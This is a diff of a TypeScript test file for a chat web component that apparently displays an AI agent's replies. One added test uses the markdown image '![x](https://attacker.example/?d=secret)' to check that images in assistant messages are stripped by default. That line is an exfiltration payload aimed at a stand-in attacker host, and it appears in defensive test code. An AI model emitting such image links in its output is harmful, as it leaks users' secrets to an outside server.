@@ -180,6 +180,41 @@ describe("AgUiChat", () => {
     expect(user.textContent).toBe("**bold**");
   });
 
+  it("strips img from assistant bubbles by default; allowImages opts back in", () => {
+    const el = mount();
+    const blocked = el.appendMessage(
+      MESSAGE_ROLE.ASSISTANT,
+      "![x](https://attacker.example/?d=secret)",
+    );
+    expect(blocked.querySelector("img")).toBeNull();
+    el.allowImages = true;
+    const permitted = el.appendMessage(MESSAGE_ROLE.ASSISTANT, "![x](https://ex.com/i.png)");
+    expect(permitted.querySelector("img")?.getAttribute("src")).toBe("https://ex.com/i.png");
+  });
+
+  it("hands the agent factory a live header getter (rotated tokens reach the agent)", async () => {
+    const el = document.createElement(ELEMENT_TAG) as AgUiChat;
+    el.setAttribute("endpoint", "/agent/");
+    el.headers = { Authorization: "Bearer token-1" };
+    const handle = makeFakeAgent({
+      script: (emit) => {
+        emit.runStart();
+        emit.runEnd();
+      },
+    });
+    let captured: (() => Record<string, string>) | undefined;
+    el.agentFactory = (options) => {
+      captured = options.getHeaders;
+      return handle.agent;
+    };
+    document.body.appendChild(el);
+    await send(el, "hi");
+    expect(captured?.()).toEqual({ Authorization: "Bearer token-1" });
+    // Rotate after the client (and agent) were built and cached.
+    el.headers = { Authorization: "Bearer token-2" };
+    expect(captured?.()).toEqual({ Authorization: "Bearer token-2" });
+  });
+
   it("submits on send-button click: appends a user bubble and emits the event", () => {
     // No endpoint here: this asserts the submit-event + user-bubble seam in
     // isolation, without engaging the AG-UI client / network path.
@@ -330,7 +365,8 @@ describe("AgUiChat", () => {
     await send(el, "fill the city");
     const card = shadow(el).querySelector<HTMLElement>(".tool-call");
     expect(card?.getAttribute("data-tool-name")).toBe("fill_field");
-    expect(card?.querySelector(".tool-call-name")?.textContent).toBe("🔧 fill_field");
+    // No label found anywhere -> auto-prettified snake_case fallback.
+    expect(card?.querySelector(".tool-call-name")?.textContent).toBe("🔧 Fill field");
     expect(card?.querySelector(".tool-call-args")?.textContent).toContain('"name": "city"');
     // fill_field isn't registered here, so it's treated as server-executed.
     expect(card?.getAttribute("data-status")).toBe("done");
@@ -535,7 +571,7 @@ describe("AgUiChat", () => {
     expect(label).toContain("Search projects");
   });
 
-  it("ignores a failed data-tools-url fetch (card falls back to the raw name)", async () => {
+  it("ignores a failed data-tools-url fetch (card falls back to the prettified name)", async () => {
     vi.stubGlobal("fetch", vi.fn().mockRejectedValue(new Error("offline")));
     const el = document.createElement(ELEMENT_TAG) as AgUiChat;
     el.setAttribute("endpoint", "/agent/");
@@ -552,7 +588,7 @@ describe("AgUiChat", () => {
     await flush();
     await send(el, "find projects");
     expect(shadow(el).querySelector(".tool-call .tool-call-name")?.textContent).toContain(
-      "list_projects",
+      "List projects",
     );
   });
 
